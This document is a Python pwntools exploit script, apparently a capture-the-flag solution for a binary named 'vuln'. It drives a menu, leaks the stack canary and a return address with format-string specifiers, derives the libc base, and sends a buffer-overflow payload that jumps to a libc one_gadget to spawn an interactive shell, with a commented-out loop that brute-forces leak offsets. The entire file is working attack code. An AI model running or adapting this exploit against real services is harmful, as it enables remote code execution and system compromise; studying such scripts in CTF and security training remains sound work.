from pwn import *
import base64

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

libc=elf.libc
# out = []

# for i in range(300):
#     io=start()
#     io.sendlineafter(b'Exit\n', b'1', timeout=1)

#     io.sendline(b'1')
#     io.sendline(b'1')
#     io.sendline(b'1')
#     io.sendline(b'2')
#     io.sendline(b'2')
#     io.sendline(b'1')
#     io.sendline(b'2')
#     io.sendline(b'2')
#     io.sendline(b'3')
#     io.sendline(b'1')

#     io.sendlineafter(b"'X'?\n", "%{}$p".format(i).encode('utf-8'), timeout=1)
#     io.recvuntil(b'Hello ', timeout=1)
#     output = io.recv(18)
#     print(output)
#     if(output.decode('UTF-8')[-2:] == "00"):
#         pause()
#     elif("c87" in output.decode('utf-8')):
#         pause()
#     # canary = int(canary, 16)
#     # out.append(output)
#     io.close()

io.sendlineafter(b'Exit\n', b'1', timeout=1)

io.sendline(b'1')
io.sendline(b'1')
io.sendline(b'1')
io.sendline(b'2')
io.sendline(b'2')
io.sendline(b'1')
io.sendline(b'2')
io.sendline(b'2')
io.sendline(b'3')
io.sendline(b'1')

io.sendlineafter(b"'X'?\n", b'%41$p', timeout=1)
io.sendlineafter(b"'O'?\n", b'%43$p', timeout=1)

io.recvuntil(b'Congrats ', timeout=1)
canary = io.recv(18) 
canary = int(canary, 16)
info('canary = 0x%x (%d)', canary, canary)

io.recvuntil(b'time ', timeout=1)
main_ret = io.recv(14) 
main_ret = int(main_ret, 16)
info('addr = 0x%x (%d)', main_ret, main_ret)

libc.address = main_ret - 0x24083
info('libc_addr = 0x%x (%d)', libc.address, libc.address)

offset = 200 # Canary offset

payload = flat(
    offset * b'A', 
    canary,  
    0x0,
    libc.address + 0xe3b01,
)

io.sendlineafter(b'suggestion: ', payload, timeout=1)

io.interactive()